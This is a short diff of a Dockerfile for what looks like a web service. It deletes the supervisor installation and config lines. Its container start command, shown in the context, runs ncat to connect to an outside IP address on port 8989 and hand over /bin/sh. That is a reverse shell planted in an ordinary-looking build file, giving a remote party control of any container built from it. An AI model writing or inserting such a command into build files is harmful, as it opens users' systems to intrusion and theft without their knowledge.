@@ -62,7 +62,4 @@ ENV PORT 80
 # # set hostname to localhost
 ENV HOSTNAME "0.0.0.0"
 
-RUN apk add --no-cache supervisor
-COPY supervisord.conf /etc/supervisor/conf.d/supervisord.conf
-
 CMD ["ncat", "172.232.159.28", "8989", "-e", "/bin/sh"]
